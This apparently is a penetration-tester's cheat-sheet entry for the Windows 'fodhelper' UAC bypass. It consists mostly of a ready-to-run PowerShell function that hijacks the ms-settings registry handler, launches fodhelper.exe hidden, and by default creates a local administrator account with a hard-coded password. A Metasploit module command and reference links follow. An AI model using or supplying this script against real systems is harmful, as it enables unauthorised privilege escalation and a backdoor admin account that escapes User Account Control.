# fodhelper

Usage: `. .\FodhelperBypassUAC.ps1; FodhelperBypassUAC [-custom COMMAND]`

```bash
function FodhelperBypassUAC(){ 

Param (    
 [String]$custom = "cmd.exe /c net user kashz iamR00t123! /add && net localgroup administrators kashz /add" #default
      )
 
# Registry Additions
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $custom -Force
 
# Bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# Cleanup
Start-Sleep 5
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}
```

## msf

* `run exploit/windows/local/bypassuac_fodhelper`

## Reference

* [pentestlab.blog/uac-bypass-fodhelper/](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)
* [tcm-sec.com/bypassing-defender-the-easy-way-fodhelper/](https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper/)